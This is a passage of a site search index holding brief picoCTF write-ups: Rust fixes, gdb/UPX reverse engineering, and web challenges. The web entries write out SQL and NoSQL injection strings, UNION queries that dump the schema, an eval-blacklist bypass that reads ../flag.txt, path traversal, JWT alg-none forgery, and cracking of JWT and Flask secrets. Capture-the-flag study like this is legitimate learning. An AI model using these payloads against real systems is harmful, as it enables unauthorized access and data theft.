\"20\", \"0c\", \"e6\", \"50\", \"d3\", \"35\"];\n\n    // Convert the hexadecimal strings to bytes and collect them into a vector\n    let encrypted_buffer: Vec&lt;u8&gt; = hex_values.iter()\n        .map(|&amp;hex| u8::from_str_radix(hex, 16).unwrap())\n        .collect();\n\n    // Create decrpytion object\n    let res = XORCryptor::new(&amp;key);\n    if res.is_err() {\n    }\n    let xrc = res.unwrap();\n\n    // Decrypt flag and print it out\n    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);\n    println!(\n        \"{}\", // How do we print out a variable in the println function? \n        String::from_utf8_lossy(&amp;decrypted_buffer)\n    );\n}\n</code></pre> <p><code>cargo run</code></p>"},{"location":"picoCTF/General%20Skills/Rust%20fixme%202/","title":"Rust fixme 2","text":"<p>The Rust Book</p> <p><code>cargo build</code> again and again until you get rid of all the errors</p> <p>The corrected code:</p> <pre><code>use xor_cryptor::XORCryptor;\n\nfn decrypt(encrypted_buffer:Vec&lt;u8&gt;, borrowed_string: &amp;mut String){ // How do we pass values to a function that we want to change?\n\n    // Key for decryption\n    let key = String::from(\"CSUCKS\");\n\n    // Editing our borrowed value\n    borrowed_string.push_str(\"PARTY FOUL! Here is your flag: \");\n\n    // Create decrpytion object\n    let res = XORCryptor::new(&amp;key);\n    if res.is_err() {\n        return; // How do we return in rust?\n    }\n    let xrc = res.unwrap();\n\n    // Decrypt flag and print it out\n    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);\n    borrowed_string.push_str(&amp;String::from_utf8_lossy(&amp;decrypted_buffer));\n    println!(\"{}\", borrowed_string);\n}\n\n\nfn main() {\n    // Encrypted flag values\n    let hex_values = [\"41\", \"30\", \"20\", \"63\", \"4a\", \"45\", \"54\", \"76\", \"01\", \"1c\", \"7e\", \"59\", \"63\", \"e1\", \"61\", \"25\", \"0d\", \"c4\", \"60\", \"f2\", \"12\", \"a0\", \"18\", \"03\", \"51\", \"03\", \"36\", \"05\", \"0e\", \"f9\", \"42\", \"5b\"];\n\n    // Convert the hexadecimal strings to bytes and collect them into a vector\n    let encrypted_buffer: Vec&lt;u8&gt; = hex_values.iter()\n        .map(|&amp;hex| u8::from_str_radix(hex, 16).unwrap())\n        .collect();\n\n    let mut party_foul = String::from(\"Using memory unsafe languages is a: \"); // Is this variable changeable?\n    decrypt(encrypted_buffer, &amp;mut party_foul); // Is this the correct way to pass a value to a function so that it can be changed?\n}\n</code></pre> <p><code>cargo run</code></p>"},{"location":"picoCTF/General%20Skills/Rust%20fixme%203/","title":"Rust fixme 3","text":"<p>The Rust Book</p> <p><code>cargo build</code> again and again until you get rid of all the errors</p> <p>The corrected code:</p> <pre><code>use xor_cryptor::XORCryptor;\n\nfn decrypt(encrypted_buffer: Vec&lt;u8&gt;, borrowed_string: &amp;mut String) {\n    // Key for decryption\n    let key = String::from(\"CSUCKS\");\n\n    // Editing our borrowed value\n    borrowed_string.push_str(\"PARTY FOUL! Here is your flag: \");\n\n    // Create decryption object\n    let res = XORCryptor::new(&amp;key);\n    if res.is_err() {\n        return;\n    }\n    let xrc = res.unwrap();\n\n    // Did you know you have to do \"unsafe operations in Rust?\n    // https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html\n    // Even though we have these memory safe languages, sometimes we need to do things outside of the rules\n    // This is where unsafe rust comes in, something that is important to know about in order to keep things in perspective\n\n    // unsafe {\n        // Decrypt the flag operations \n        let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);\n\n        // Creating a pointer \n        let decrypted_ptr = decrypted_buffer.as_ptr();\n        let decrypted_len = decrypted_buffer.len();\n\n        // Unsafe operation: calling an unsafe function that dereferences a raw pointer\n        unsafe{\n            let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, decrypted_len);\n            borrowed_string.push_str(&amp;String::from_utf8_lossy(decrypted_slice));\n        }\n\n    // }\n    println!(\"{}\", borrowed_string);\n}\n\nfn main() {\n    // Encrypted flag values\n    let hex_values = [\"41\", \"30\", \"20\", \"63\", \"4a\", \"45\", \"54\", \"76\", \"12\", \"90\", \"7e\", \"53\", \"63\", \"e1\", \"01\", \"35\", \"7e\", \"59\", \"60\", \"f6\", \"03\", \"86\", \"7f\", \"56\", \"41\", \"29\", \"30\", \"6f\", \"08\", \"c3\", \"61\", \"f9\", \"35\"];\n\n    // Convert the hexadecimal strings to bytes and collect them into a vector\n    let encrypted_buffer: Vec&lt;u8&gt; = hex_values.iter()\n        .map(|&amp;hex| u8::from_str_radix(hex, 16).unwrap())\n        .collect();\n\n    let mut party_foul = String::from(\"Using memory unsafe languages is a: \");\n    decrypt(encrypted_buffer, &amp;mut party_foul);\n}\n</code></pre> <p><code>cargo run</code></p>"},{"location":"picoCTF/Reverse%20Engineering/Classic%20Crackme%200x100/","title":"Classic Crackme 0x100","text":"<ol> <li>Start gdb, <code>break</code> at main, <code>run</code>, and <code>disas</code> main</li> <li> <p>We see a memcmp at the end of code, the result of which seems to make the program jump to print success or failure message:</p> <p><code>gdb 0x0000000000401364 &lt;+494&gt;:  mov    %rcx,%rsi 0x0000000000401367 &lt;+497&gt;:  mov    %rax,%rdi 0x000000000040136a &lt;+500&gt;:  call   0x401060 &lt;memcmp@plt&gt; 0x000000000040136f &lt;+505&gt;:  test   %eax,%eax</code></p> </li> <li> <p>Set a breakpoint and look at the arguments of memcmp:</p> <p>```gdb (gdb) b *main+500 Breakpoint 2 at 0x40136a: file main_sample.c, line 32. (gdb) c Continuing. Enter the secret password: abcdef</p> <p>Breakpoint 2, 0x000000000040136a in main () at main_sample.c:32 32  in main_sample.c (gdb) x/s $rsi 0x7fffffffdd40: \"ztqittwtxtieyfrslgtzuxovlfdnbrsnlrvyhhsdxxrfoxnjbl\" (gdb) x/s $rdi 0x7fffffffdd00: \"aefjhlTWQTvWTWWZQVTWTWWZTWQZWZZ]QTNWTWWZTW]ZWZZ]TY\" ```</p> <p>Multiple runs with different password input print the same \\(rsi* but different *\\)rdi \\ On checking, \\(rsi* is not the password, but could be an encoded form of it 4. The final value of *\\)rsi could be a shift of what is entered, and this can be verified by inputs \"aaaaaaaaaaaaaaa...\" and \"bbbbbbbbbbbbb..\" 5. Simple python script to reverse the shifting:</p> <p>```python s = \"ruuxuxxauxxaxaaduxxaxaadxaadaddguxxaxaadxaadaddgxa\" # $rsi t = 'r'*len(s) # input</p> <p>l = [(ord(t[i]) - ord(s[i]) + 26) % 26 for i in range(len(s))]</p> <p>f = 'ztqittwtxtieyfrslgtzuxovlfdnbrsnlrvyhhsdxxrfoxnjbl' # $rdi</p> <p>ans = [chr((ord(f[i]) - ord('a') + l[i]) % 26 + ord('a')) for i in range(len(f))] print(''.join(ans)) ```</p> </li> </ol>"},{"location":"picoCTF/Reverse%20Engineering/Flag%20Hunters/","title":"Flag Hunters","text":"<p>this input works:</p> <pre><code>yay;RETURN 0\n</code></pre>"},{"location":"picoCTF/Reverse%20Engineering/GDB%20baby%20step%201/","title":"GDB baby step 1","text":"<p>Give executing permission and start gdb; break at main and run</p> <ol> <li>Disassemble main(): <code>disas main</code></li> <li>Look at the last <code>mov</code> instruction</li> </ol>"},{"location":"picoCTF/Reverse%20Engineering/GDB%20baby%20step%202/","title":"GDB baby step 2","text":"<p>Give executing permission and start gdb; break at main and run</p> <ol> <li>Disassemble main(): <code>disas main</code></li> <li>Set a breakpoint at the end of main, at the ret instruction: <code>break *0x&lt;ins hex num&gt;</code></li> <li>Look at the registers: <code>info r</code></li> </ol>"},{"location":"picoCTF/Reverse%20Engineering/GDB%20baby%20step%203/","title":"GDB baby step 3","text":"<p>Give executing permission and start gdb; break at main and run</p> <ol> <li>Disassemble main(): <code>disas main</code></li> </ol> <p><code>gdb    .    .    0x0000000000401111 &lt;+11&gt;:   mov    %rsi,-0x20(%rbp)    0x0000000000401115 &lt;+15&gt;:   movl   $0x2262c96b,-0x4(%rbp)    0x000000000040111c &lt;+22&gt;:   mov    -0x4(%rbp),%eax    .    .</code></p> <ol> <li> <p>Set a breakpoint after movl: <code>break *main+22</code></p> </li> <li> <p>Examine the bytes: <code>x/4xb $rbp-4</code></p> </li> </ol>"},{"location":"picoCTF/Reverse%20Engineering/GDB%20baby%20step%204/","title":"GDB baby step 4","text":"<p>Give executing permission and start gdb; break at main and run</p> <ol> <li>Disassemble main()</li> <li>Set a breakpoint at func1 and continue</li> <li>Disassemble func1(); look at the <code>imul</code> instruction</li> </ol>"},{"location":"picoCTF/Reverse%20Engineering/Quantum%20Scrambler/","title":"Quantum Scrambler","text":"<pre><code>import pwn\nconn = pwn.remote('verbal-sleep.picoctf.net', 61849)\ncypher = conn.recvline().decode().strip()\nconn.close()\n# print(cypher)\nL = eval(cypher)\nfor x in L:\n    if(type(x[0]) == str):\n        print(chr(int(x[0], 16)), end='')\n    if(type(x[-1]) == str):\n        print(chr(int(x[-1], 16)), end='')\n    elif(type(x[-1]) == list and type(x[-1][0]) == str):\n        print(chr(int(x[-1][0], 16)), end='')\n</code></pre>"},{"location":"picoCTF/Reverse%20Engineering/Tap%20into%20Hash/","title":"Tap into Hash","text":"<pre><code>import hashlib\n\ndef xor_bytes(a, b):\n    return bytes(x ^ y for x, y in zip(a, b))\n\ndef decrypt(ciphertext, key):\n    block_size = 16\n    plaintext = b''\n\n    key_hash = hashlib.sha256(key).digest()\n    for i in range(0, len(ciphertext), block_size):\n        cipher_block = ciphertext[i:i + block_size]\n        plain_block = xor_bytes(cipher_block, key_hash)\n        plaintext += plain_block\n\n    return plaintext.rstrip(plaintext[-1:])\n\nkey = b'\\x8b\\x9a\\x00G\\xfe\\xb3\\xf3\\x93\\xdb\\xa8yT\\xfe\\x15\\x87a\\xf4\\xdf\\x00\\x8d\\xee\\xab\\xd9\\t^|\\x04(%\\x81\\x9e\\xf8'\nenc_flag = b'Z5Wo\\xe9\\xbd\\xf4\\xed&lt;\\xeb=\\xcb%\\xc4\\xf0&gt;S2\\x0bl\\xe9\\xe9\\xf0\\xe8&gt;\\xe8n\\x91q\\xca\\xad=\\x01fRo\\xbe\\xba\\xa2\\xb5f\\xb88\\x90t\\xc4\\xaco\\x041\\x01n\\xb3\\xbd\\xa1\\xb4l\\xee9\\xc9u\\x9e\\xf1:O0\\x035\\xed\\xeb\\xf6\\xean\\xbei\\xcc.\\x9f\\xfe8\\x008\\x04l\\xef\\xee\\xf4\\xe9g\\xbf8\\x9bt\\x9f\\xaanZ6\\x0b8\\xef\\xbb\\xa6\\xb8&gt;\\xe9n\\xcd$\\xc5\\xf08\\x00eQ&gt;\\xef\\xed\\xf4\\xeaf\\xbdm\\x9e \\xcb\\xfe9\\x07-\\x03=\\xba\\xb9\\xa2\\xbcl\\xb4:\\x9c&amp;\\x9e\\xab8U4\\x05=\\xe8\\xec\\xa4\\xeao\\xefk\\x9c#\\x9a\\xacn\\x00bCd\\xe8\\xb7\\xd6\\xd8\\x19\\xf69\\xc4x\\x9f\\xa2UQSae\\xdd\\xb1\\xc7\\xee\\x0b\\xbc*\\xcbO\\xa3\\x91_\\x08M\\x03\\x7f\\xbf\\xe1\\xf6\\xc4\\x00\\xfc\\x18\\xd2z\\xb6\\x93p Kl;\\xbb\\xee\\xa1\\xbb9\\xef9\\xd5t\\x99\\xf9;Ve\\x04i\\xb3\\xe9\\xf3\\xbd;\\xb8m\\x91s\\xcf\\xff:\\x019\\x04=\\xbd\\xb9\\xa4\\xeff\\xb5&gt;\\xcd:\\xcc\\xf9&lt;Ta\\x01?\\xbd\\xe9\\xf0\\xed=\\xefi\\x9fr\\x98\\xf8=[a\\x00:\\xbc\\xba\\xf3\\xe9k\\xeci\\x90\"\\x98\\xfbnZaPk\\xed\\xe9\\xa6\\xbf=\\xe8&gt;\\x99.\\xc5\\xac?Wa\\x02&lt;\\xbd\\xb9\\xa0\\xeaj\\xecn\\x9b$\\xd1\\xf9:\\x04dR:\\xb9\\xea\\xa3\\xedi\\xebh\\x9d\\'\\xcc\\xfah\\x008U9\\xe8\\xe8\\xf6\\xba&gt;\\xefk\\x98#\\xce\\xfb;\\x038\\n?\\xea\\xb9\\xf7\\xbfg\\xbbk\\x90q\\x9e\\xacn[f\\x06l\\xef\\xbb\\xa7\\xbaf\\xbd9\\x9a\"\\xcf\\xcb\\x08'\n\ndecrypted_text = decrypt(enc_flag, key)\nprint(\"Decrypted Text:\", decrypted_text.decode())\n</code></pre>"},{"location":"picoCTF/Reverse%20Engineering/packer/","title":"packer","text":"<ol> <li> <p>Trying <code>file</code> and <code>strings</code>:</p> <p>```shell file out</p> <p>out: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header ```</p> <p>Can't use GDB as file is stripped</p> <p>```shell strings out</p> <p>.     .     UPX!     UPX! ```</p> <p>Hmm... It is packed with UPX</p> </li> <li> <p>Unpack:</p> <p>```shell upx -d out file out</p> <p>out: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=fedfa2b06929b414534771a3fdd291559e1190b1, for GNU/Linux 3.2.0, not stripped ```</p> <p>\"not stripped\" yay! GDB time now</p> </li> <li> <p><code>break</code> at main, <code>run</code>, and <code>disas</code>:</p> <p><code>gdb . . 0x0000000000401f47 &lt;+482&gt;:  test   %eax,%eax 0x0000000000401f49 &lt;+484&gt;:  jne    0x401f65 &lt;main+512&gt; . .</code></p> <p>The result of test seems to decide the final jump..</p> </li> <li> <p>Change the value of $eax:</p> <p>```gdb (gdb) b *main+482 Breakpoint 2 at 0x401f47 (gdb) c Continuing. Enter the password to unlock this file: random You entered: random</p> <p>Breakpoint 2, 0x0000000000401f47 in main () (gdb) set $rax=0 (gdb) c Continuing. Password correct, please see flag: 7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f33373161613966667d ```</p> </li> <li> <p>Convert hex to ASCII</p> <p><code>shell echo \"7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f33373161613966667d\" | xxd -r -p</code></p> </li> </ol>"},{"location":"picoCTF/Reverse%20Engineering/reverse/","title":"reverse","text":"<ol> <li> <p><code>break</code> at main, <code>run</code>, and <code>disas</code>:</p> <p><code>gdb . . 0x000055555555527e &lt;+181&gt;:  test   %eax,%eax 0x0000555555555280 &lt;+183&gt;:  jne    0x55555555529c &lt;main+211&gt; . .</code></p> <p>The result of test seems to decide the final jump..</p> </li> <li> <p>Change the value of $eax:</p> <p>```gdb (gdb) b *main+181 Breakpoint 2 at 0x55555555527e (gdb) c Continuing. Enter the password to unlock this file: flag You entered: flag</p> <p>Breakpoint 2, 0x000055555555527e in main () (gdb) set $rax=0 (gdb) c Continuing. Password correct, please see flag: picoCTF{3lf_r3v3r5ing_succe55ful_7851ef7d} ```</p> </li> </ol>"},{"location":"picoCTF/Reverse%20Engineering/unpackme/","title":"packer","text":"<ol> <li> <p>Trying <code>file</code> and <code>strings</code>:</p> <p>```shell file unpackme-upx </p> <p>unpackme-upx: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header ```</p> <p>Can't use GDB as file is stripped</p> <p>```shell strings unpackme-upx</p> <p>.     .     UPX!     UPX! ```</p> <p>Hmm... It is packed with UPX</p> </li> <li> <p>Unpack:</p> <p>```shell upx -d unpackme-upx file unpackme-upx</p> <p>unpackme-upx: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=5e4be04529afcdb8fa8855e3138c3f51047fa123, for GNU/Linux 3.2.0, not stripped ```</p> <p>\"not stripped\" yay! GDB time now</p> </li> <li> <p><code>break</code> at main, <code>run</code>, and <code>disas</code>:</p> <p><code>gdb . . 0x0000000000401ec0 &lt;+125&gt;:  call   0x410d30 &lt;__isoc99_scanf&gt; 0x0000000000401ec5 &lt;+130&gt;:  mov    -0x3c(%rbp),%eax 0x0000000000401ec8 &lt;+133&gt;:  cmp    $0xb83cb,%eax 0x0000000000401ecd &lt;+138&gt;:  jne    0x401f12 &lt;main+207&gt; . .</code></p> <p>Seems the desired number is 0xb83cb = 754635</p> </li> </ol>"},{"location":"picoCTF/Web%20Exploitation/3v%40l/","title":"3v@l","text":"<p>Blacklisted words: os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind</p> <p>Regex to bypass: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|.[A-Za-z0-9]{1,3}\\b|[\\\\/]|..'</p> <ul> <li><code>0x[0-9A-Fa-f]+</code>: Hexadecimal numbers prefixed with 0x</li> <li><code>\\\\u[0-9A-Fa-f]{4}</code> : Unicode escape sequences in the \\uXXXX format</li> <li><code>%[0-9A-Fa-f]{2}</code> : URL-encoded characters in the %XX format</li> <li><code>\\.[A-Za-z0-9]{1,3}\\b</code> : File extensions of 1 to 3 alphanumeric characters preceded by a dot</li> <li><code>[\\\\\\/]</code> : Backslash or forward slash</li> <li><code>\\.\\.</code> : ..</li> </ul> <pre><code>__import__(chr(111)+chr(115)).listdir('.'+'.')\n# os.listdir('..')\n</code></pre> <pre><code>open('.'+'.'+chr(47)+'flag.'+'txt').read()\n# open(../flag.txt).read()\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/Bookmarklet/","title":"Bookmarklet","text":"<ol> <li>Create a bookmarklet</li> <li>Right click on it and open in new tab</li> </ol>"},{"location":"picoCTF/Web%20Exploitation/Client-side-again/","title":"Client-side-again","text":"<p>Similar to this, but more work.</p>"},{"location":"picoCTF/Web%20Exploitation/Cookie%20Monster%20Secret%20Recipe/","title":"Cookie Monster Secret Recipe","text":"<p>Log in using any username and password \\ Now check the cookie associated with the site; decode (base64) it</p>"},{"location":"picoCTF/Web%20Exploitation/Cookies/","title":"Cookies","text":"<p>Inspect and view the Cookies used/set by the site. There is a cookie with name \"name\" and value \"-1\" On changing the value and reloading, a request is sent (observe in Networks tab), and a different message is displayed on the screen for different value. Copy the GET request as curl, and run a script:</p> <pre><code>START=1\nEND=100\n\nfor ((i=START; i&lt;=END; i++))\ndo\n    echo \"Running curl with cookie name: $i\"\n    curl 'http://mercury.picoctf.net:21485/check' \\\n    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \\\n    -H 'Accept-Language: en-GB,en;q=0.9' \\\n    -H 'Cache-Control: max-age=0' \\\n    -H \"Cookie: name=$i\" \\\n    -H 'Proxy-Connection: keep-alive' \\\n    -H 'Referer: http://burpsuite/' \\\n    -H 'Upgrade-Insecure-Requests: 1' \\\n    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' \\\n    --insecure\n    echo -e \"\\n\"\ndone\n</code></pre> <p><code>grep \"picoCTF\"</code> can be used to print the flag while the script is running.</p>"},{"location":"picoCTF/Web%20Exploitation/Forbidden%20Paths/","title":"Forbidden Paths","text":"<p>Paths are filtered at URL, but not at the input box...</p> <p>Just enter <code>../../../../flag.txt</code> and click Read</p>"},{"location":"picoCTF/Web%20Exploitation/GET%20aHEAD/","title":"GET aHEAD","text":"<p>Inspect and open Networks Tab. We observe that a GET request is sent for Red and POST for Blue Using BurpSuite, intercept the request, change the method to HEAD (hinted from the title), and forward the request. Response headers contain the flag.</p>"},{"location":"picoCTF/Web%20Exploitation/Includes/","title":"Includes","text":"<p>Inspect and open Sources Tab. Go through the .js and .css files</p>"},{"location":"picoCTF/Web%20Exploitation/Insp3ct0r/","title":"Insp3ct0r","text":"<p>The flag is broken into 3 parts:</p> <ol> <li>In <code>index.html</code></li> <li>In <code>mycss.css</code></li> <li>In <code>myjs.js</code></li> </ol>"},{"location":"picoCTF/Web%20Exploitation/Inspect%20HTML/","title":"Inspect HTML","text":"<p>Just inspect and go though the source code</p>"},{"location":"picoCTF/Web%20Exploitation/IntroToBurp/","title":"IntroToBurp","text":"<p>Use Burp Suite</p> <p>Intercept HTTP Request sent when OTP is submitted, remove the Request body parameter otp, and forward the modified request.</p>"},{"location":"picoCTF/Web%20Exploitation/Irish-Name-Repo-1/","title":"Irish-Name-Repo-1","text":"<p>On inspecting the login page:</p> <pre><code>&lt;form action=\"login.php\" method=\"POST\"&gt;\n    &lt;fieldset&gt;\n        &lt;div class=\"form-group\"&gt;\n            &lt;label for=\"username\"&gt;Username:&lt;/label&gt;\n            &lt;input type=\"text\" id=\"username\" name=\"username\" class=\"form-control\"&gt;\n        &lt;/div&gt;\n        &lt;div class=\"form-group\"&gt;\n            &lt;label for=\"password\"&gt;Password:&lt;/label&gt;\n            &lt;div class=\"controls\"&gt;\n                &lt;input type=\"password\" id=\"password\" name=\"password\" class=\"form-control\"&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n        &lt;input type=\"hidden\" name=\"debug\" value=\"0\"&gt;\n\n        &lt;div class=\"form-actions\"&gt;\n            &lt;input type=\"submit\" value=\"Login\" class=\"btn btn-primary\"&gt;\n        &lt;/div&gt;\n    &lt;/fieldset&gt;\n&lt;/form&gt;\n</code></pre> <p>Edit the html and set the debug value to 1</p> <p>On trying to log in, we get:</p> <pre><code>username: user\npassword: pass\nSQL query: SELECT * FROM users WHERE name='user' AND password='pass'\n</code></pre> <p>SQL injection:</p> <pre><code>username: ' OR '1'='1\npassword: ' OR '1'='1\nSQL query: SELECT * FROM users WHERE name='' OR '1'='1' AND password='' OR '1'='1'\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/Irish-Name-Repo-2/","title":"Irish-Name-Repo-2","text":"<p>Prev injection doesn't work here, try something else</p> <pre><code>username: admin';--\npassword: random\nSQL query: SELECT * FROM users WHERE name='admin';--' AND password='random'\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/Irish-Name-Repo-3/","title":"Irish-Name-Repo-3","text":"<p>The login form is different from the Prev challenge</p> <p>On trying to log in:</p> <pre><code>password: pass\nSQL query: SELECT * FROM admin where password = 'cnff'\n</code></pre> <p>Trying SQL injection:</p> <pre><code>password: ' OR '1'='1\nSQL query: SELECT * FROM admin where password = '' BE '1'='1'\n</code></pre> <p>Clearly, the alphabetical characters are being shifted, so enter a shifted password:</p> <pre><code>password: ' BE '1'='1\nSQL query: SELECT * FROM admin where password = '' OR '1'='1'\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/It%20is%20my%20Birthday/","title":"It is my Birthday","text":"<pre><code>I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. \n</code></pre> <ol> <li>On submitting the same PDFs with same/different names, we get \"Files are not different!\"</li> <li>On submitting two different random pdfs, we get \"MD5 hashes do not match!\"</li> <li>We need to submit two different pdfs, MD5 hash of whose binary data is the same</li> </ol> <p>Searching for MD5 collisions led to this</p> <pre><code>echo -n \"TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak\" &gt; 1.pdf\necho -n \"TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak\" &gt; 2.pdf\n</code></pre> <p><code>-n</code> is important, otherwise a newline is added by <code>echo</code> which interferes with the hash</p> <p>Uploading these two pdfs works!</p>"},{"location":"picoCTF/Web%20Exploitation/JAuth/","title":"JAuth","text":"<p>Upon logging in with the given test credentials, we get a JWT cookie, decoding which gives:</p> <pre><code>{\n  \"typ\": \"JWT\",\n  \"alg\": \"HS256\"\n}\n</code></pre> <pre><code>{\n  \"auth\": 1757758147878,\n  \"agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36\",\n  \"role\": \"user\",\n  \"iat\": 1757758148\n}\n</code></pre> <p>Trying the attack in No Way JOSE challenge of Crypohack:</p> <pre><code>{\n  \"typ\": \"JWT\",\n  \"alg\": \"non\"\n}\n</code></pre> <pre><code>{\n  \"auth\": 1757758147878,\n  \"agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36\",\n  \"role\": \"admin\",\n  \"iat\": 1757758148\n}\n</code></pre> <p>Encode the above to get a token, and edit the cookie. Reloading displays the flag!</p>"},{"location":"picoCTF/Web%20Exploitation/JaWT%20Scratchpad/","title":"JaWT Scratchpad","text":"<p>The homepage asks us to register with a name.</p> <p>Using \"admin\" results in:</p> <pre><code>YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT.\n</code></pre> <p>Using any other name logs us in, and stores a JWT cookie, decoding which gives:</p> <pre><code>{\n  \"typ\": \"JWT\",\n  \"alg\": \"HS256\"\n}\n</code></pre> <pre><code>{\n  \"user\": \"john\"\n}\n</code></pre> <p>The text on the page links to JohnTheRipper</p> <pre><code>Register with your name!\nYou can use your name as a log in, because that's quick and easy to remember! If you don't like your name, use a short and cool one like John!\n</code></pre> <p>Using the said tool:</p> <pre><code>run $ echo \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y\" &gt; jwt.txt\nrun $ ./john jwt.txt --format=HMAC-SHA256 --wordlist=/home/harshit/Downloads/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])\nWill run 12 OpenMP threads\nPress 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status\nilovepico        (?)     \n1g 0:00:00:02 DONE (2025-09-13 15:49) 0.4310g/s 3188Kp/s 3188Kc/s 3188KC/s iluve$..ilovemymother89\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p>So, the SECRET is <code>ilovepico</code></p> <p>Using this secret and payload {\"user\": \"admin\"}, create JWT token. Edit the value of the cookie, reloading now displays the flag!</p>"},{"location":"picoCTF/Web%20Exploitation/Local%20Authority/","title":"Local Authority","text":"<ol> <li>Inspect and open Sources tab; try to log in with some random credentials</li> <li><code>secure.js</code> appears in sources. This contains correct credentials.</li> </ol>"},{"location":"picoCTF/Web%20Exploitation/MatchTheRegex/","title":"MatchTheRegex","text":"<p>On inspecting, we find the regex expected to be matched. Enter a string that matches and submit.</p>"},{"location":"picoCTF/Web%20Exploitation/More%20SQLi/","title":"More SQLi","text":"<p>Solution of prev problem doesn't work here..</p> <p>Log in using: \\ Username: anything \\ Password: <code>' OR 1=1 --</code></p> <p>On successful login, we get a page with input box, which is a parameter for an SQL query whose result is displayed as on the page.</p> <p>Find the no. of columns being returned by submitting inputs:</p> <pre><code>algiers' ORDER BY 1 --\nalgiers' ORDER BY 2 --\nalgiers' ORDER BY 3 --\nalgiers' ORDER BY 4 --\n</code></pre> <p>No. of columns is 3. Find the sql engine being used by trying out version queries. Query for SQLLite is successful.</p> <pre><code>algiers' UNION SELECT sqlite_version(), NULL, NULL --\n</code></pre> <p>Print all the tables and columns:</p> <pre><code>algiers' UNION SELECT m.name as tbl, p.name as col, NULL FROM sqlite_master m left outer join pragma_table_info((m.name)) p on m.name &lt;&gt; p.name order by tbl, col --\n</code></pre> <p>Notice a flag column, display it:</p> <pre><code>algiers' UNION SELECT flag,NULL,NULL FROM more_table --\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/Most%20Cookies/","title":"Most Cookies","text":"<p>Observing the source key, we find that:</p> <ul> <li>There's a list of cookie names, from which one is chosen as app secret.</li> <li><code>/search</code>ing stores the name as session cookie \"very_auth:name\", which if present in the above list redirects to <code>/display</code></li> <li>To get the flag we need to have cookie as \"very_auth:admin\", but this is not in the cookie name list, so the redirection doesn't happen</li> </ul> <p>Try to get the secret key using flask-unsign:</p> <pre><code>flask-unsign --unsign --server 'http://mercury.picoctf.net:44693/' --wordlist cookie_list.txt\n</code></pre> <p>Create a signed cookie:</p> <pre><code>flask-unsign --sign --cookie \"{'very_auth':'admin'}\" --secret '&lt;secret&gt;'\n</code></pre> <p>Now, go to <code>/display</code>, edit the session cookie and reload</p>"},{"location":"picoCTF/Web%20Exploitation/No%20Sql%20Injection/","title":"No Sql Injection","text":"<p>Resource</p> <p>Creds: \\ email: <code>picoplayer355@picoctf.org</code> password: <code>{\"$ne\":\"wrong\"}</code></p> <p>After logging in as Admin, check Session storage for <code>token</code> and decode (b64) it</p>"},{"location":"picoCTF/Web%20Exploitation/Pachinko/","title":"Pachinko","text":"<p>Repeated requests (and patience) worked:</p> <pre><code>while True:\n    response = requests.post(url+'check', json={\"circuit\":[]})\n    flag = response.json().get('flag')\n    print(flag)\n    if \"picoCTF\" in flag:\n        break\n</code></pre>"},{"location":"picoCTF/Web%20Exploitation/Power%20Cookie/","title":"Power Cookie","text":"<p>Logging in as guest sets a cookie <code>isAdmin</code> with value 0; change it to 1 and refresh</p>"},{"location":"picoCTF/Web%20Exploitation/Roboto%20Sans/","title":"Roboto Sans","text":"<p>Check out <code>robots.txt</code> \\ It contains base64-encoded strings, decoding which tells about some file paths to look at</p>"},{"location":"picoCTF/Web%20Exploitation/SOAP/","title":"SOAP","text":"<p>A webpage, with three cards, each with a \"Details\" button</p> <p>On clicking on Details, a POST request is sent with the payload:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;data&gt;&lt;ID&gt;1&lt;/ID&gt;&lt;/data&gt;\n</code></pre> <p>On inspecting the source code, we find <code>xmlDetailsCheckPayload.js</code>:</p> <pre><code>window.contentType = 'application/xml';\n\nfunction payload(data) {\n    var xml = '&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;';\n    xml += '&lt;data&gt;';\n\n    for(var pair of 